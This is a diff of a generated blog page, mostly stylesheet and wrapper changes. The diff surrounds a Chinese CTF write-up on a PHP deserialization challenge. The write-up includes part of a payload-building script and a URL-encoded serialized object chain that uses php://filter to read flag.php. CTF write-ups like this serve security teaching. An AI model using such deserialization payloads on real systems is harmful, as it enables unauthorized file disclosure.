@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -250,7 +258,7 @@
 <li>PHP反序列化       </li>
 <li>代码审计      </li>
 </ul>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><div class="hljs"><pre><code><pre><code class="hljs php">Welcome to index.php
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code><pre><code class="hljs php">Welcome to index.php
 <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-comment">//flag is in flag.php</span>
 <span class="hljs-comment">//WTF IS THIS?</span>
@@ -303,7 +311,7 @@
 <span class="hljs-keyword">else</span>&#123;
     $a=<span class="hljs-keyword">new</span> Show;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <p>三个类<code>Modifier、Show、Test</code><br>三个魔法函数<code>__invoke、__toString、__get</code>      </p>
 <ol>
 <li><code>__invoke</code>:当尝试以调用函数的方式调用一个对象时，该方法会被自动调用;比如本题Test类中的<code>$function()</code>将$function等于一个实例化的类即可调用该函数。          </li>
@@ -312,7 +320,7 @@
 </ol>
 <p>将show中的str=实例化的Test<br>Test中的p等于modifier中的var<br>用var利用伪协议读取<code>flag.php</code>       </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p>
-<div class="hljs"><pre><code>```php
+<pre><code>```php
 &lt;?php
 
 class Modifier
@@ -344,9 +352,9 @@ $c=new show($a);
 $b=urlencode(serialize($c));
 echo $b;
 ?&gt;
-``</code></pre></div>
+``</code></pre>
 <p>结果：      </p>
-<div class="hljs"><pre><code>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22aa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D       </code></pre></div>
+<pre><code>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A2%3A%22aa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D       </code></pre>
 <p>输出base64解码即可</p>
 
             </div>
@@ -492,6 +500,8 @@ echo $b;
 
 
 
+  
+    
   
 
 
